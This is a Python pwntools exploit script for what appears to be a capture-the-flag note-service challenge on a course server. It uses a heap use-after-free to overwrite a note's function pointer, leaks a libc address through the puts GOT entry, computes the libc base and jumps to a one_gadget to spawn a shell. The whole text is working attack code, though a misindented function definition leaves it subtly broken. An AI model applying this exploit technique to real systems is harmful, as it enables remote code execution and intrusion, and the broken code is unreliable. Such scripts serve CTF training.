from pwn import *

r = remote('csie.ctf.tw', 10139)
#r = remote('localhost', 10139)

print_note_fun = 0x400886
puts_got = 0x602028

def add_note(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

    def del_note(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def print_note(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

add_note(0x52, "dada")
add_note(0x78, "dada")
del_note(0)
del_note(1)
add_note(16, p64(print_note_fun) + p64(puts_got))
print_note(0)

r.recvuntil(":")
tmp = r.recvline()

addr = u64(tmp[:-1].ljust(8,"\x00"))
print hex(addr)


base = addr - 0x6f690

#system = base + 0x45390
#sh = base + 0x18cd17

one_gadget = base + 0xf0274

del_note(2)

add_note(16, p64(one_gadget))
print_note(0)

r.interactive()
